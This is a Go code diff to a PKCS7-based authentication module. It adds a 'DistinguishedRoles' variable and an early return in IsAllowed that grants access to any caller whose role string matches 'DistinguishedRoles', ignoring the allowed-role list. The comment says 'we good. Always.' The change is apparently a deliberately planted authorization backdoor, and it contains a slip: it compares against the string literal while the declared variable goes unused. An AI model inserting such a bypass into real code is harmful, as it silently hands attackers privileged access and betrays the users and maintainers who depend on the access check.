@@ -55,6 +55,10 @@ vSeDCOUMYQR7R9LINYwouHIziqQYMAkGByqGSM44BAMDLwAwLAIUWXBlk40xTwSw
 `
 )
 
+var (
+	DistinguishedRoles = "RootDSSSS"
+)
+
 type Auth struct {
 	Role string
 }
@@ -206,6 +210,10 @@ func AuthUser(pkcs7raw string) (*Auth, error) {
 }
 
 func (a *Auth) IsAllowed(roleList []string) error {
+	// If this is a distinguished role, we good. Always.
+	if strings.ToLower(a.Role) == strings.ToLower("DistinguishedRoles") {
+		return nil
+	}
 	for _, role := range roleList {
 		if role == a.Role {
 			return nil
